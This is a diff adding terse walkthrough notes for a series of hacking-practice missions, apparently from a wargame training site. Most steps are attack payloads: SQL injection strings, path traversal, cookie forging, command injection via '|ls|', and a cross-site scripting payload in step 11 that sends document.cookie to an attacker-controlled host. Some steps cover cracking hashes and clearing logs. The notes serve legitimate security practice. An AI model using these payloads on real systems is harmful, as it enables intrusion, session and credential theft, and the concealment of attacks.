@@ -1,0 +1,55 @@
+1: vote.php?id=0&vote=1111111111111111111
+
+2: use SQL in admin page 'OR '1' ='1 in both box
+
+3: find oldindex.php then copy code and submit poetry with new file =../index.php
+
+4: use SQL injection  -1 UNION SELECT email,email,email,email FROM level4_email
+
+5: use http://www.securitystats.com/tools/hashcrack.php to crack MD5 pw LEVEL UP!
+
+6: use http://tepster3.tripod.com/tepster/id14.html to crack the encryption  LEVEL UP!
+
+7: find where admin is at then use .php?file=images/admin/htpasswd to view the pw via <img src> LEVEL UP!
+
+8: go to userinfo and put in 'OR '1' ='1 and find "GaryWilliamHunter" then register with whatever u want , log in as you registered
+then use javascript to void "accountUsername=GaryWilliamHunter" , send 10 mil to dropCash
+then go back to logged name u used, view source and change "hidden" to "text" for the cleardir and put in "logfiles" in box 
+LEVEL UP!
+
+9: log in as r-conner then use private msg to send script to m-crap  using this 
+window.navigate("http://www.hackthissite.org/missions/mission9/subscribemailing.php?strFilename="./files/logs/logs.txt"&strEmailAddress=document.cookie+'@'")
+get a reply, use javascript
+javascript:void(document.cookie="strUsername=m-crap@crappysoft.com")
+javascript:void(document.cookie="strPassword=94a35a3b7befff5eb2a8415af04aa16c")
+javascript:void(document.cookie="intID=1")
+then go to pay salary and click on red area "pay"
+then go to mailing list and view source and edit code to "files/logs/logs.txt" then subscribe to clear logs! LEVEL UP!
+
+10: login as Zach Sanchez using pw  liberty638,  look at staff listing. find gfreeman, (google up his name) u will find pw is halflife
+then use firefox spoof the useragent as holy_teacher, then use javascript:void admin=1 then click on change grades for Zach, use 
+URL to input "staff.php?action=changegrades&changeaction=modrec&rec=1&studentid=1&grade=5"  LEVEL UP!
+
+11: use unix "ls" with perl piping = |ls| to find directory listing,  using "client_http_docs" then use
+firefox to spoof useragent with <script>document.location.href="http//<ip>cookie.php?' +document.cookie</script>, then 
+go to /therightwayraido/ once cookie is stolen, look in your logs for "forum_user=rich" "forum_pass=encrypted" then
+use javascript to void that user/pass and go to /therightwayradio/ then enter forum, 
+
+use read.pl?thread=/usr/vars/www/html_docs/db  to get the pw (Topic: space46::space46-account-suspended-password)
+
+then go back to budgetserv, use admin/ to login as space46 and the pw then use Proxomiton to disable the meta refresh. or
+use opra by hitting ESC to stop the page, click on upload or enter any folders to LEVEL UP! 
+
+
+12: use the address box that says [http:// blank]  enter something then look at URL. change to file://c:  you will find the directory
+then go to web/html/heartlandadminpanel.html  u know its .pl  remember it. then go back to guestbook.txt enter something
+then look at url. use guest.pl?action=read&file=heartlandadminpanel.pl to look inside the file to get username and pw 
+( jbardus and heartlandnetworkadministrator as pw) then go back to heartlandadminpanel.html. then enter the user and pass
+
+LEVEL UP! 
+
+13:Go to the speeches link and type in url speeches2.php?-1 or any nbr and u will notice the error messages.. look for hashed nbrs.
+find " 21232f297a57a5a743894a0e4a801fc3 " and put in url as a folder. to access the admin area. login and pw ( ? ) 
+
+
+14:
